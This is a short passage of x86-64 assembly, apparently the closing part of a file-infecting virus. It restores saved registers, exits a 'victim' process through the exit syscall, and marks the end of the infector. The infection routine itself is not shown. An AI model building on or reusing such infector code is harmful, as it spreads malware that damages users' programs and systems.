    mov     old_rsi(%rip), %rsi
    mov     old_r8(%rip), %r8
    mov     old_r9(%rip), %r9
    mov     old_r10(%rip), %r10
    mov     old_r11(%rip), %r11
    mov     old_r12(%rip), %r12
    mov     old_r13(%rip), %r13
    mov     old_r14(%rip), %r14
    mov     old_r15(%rip), %r15

_exit_victim:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall

_fin_infector:
    nop
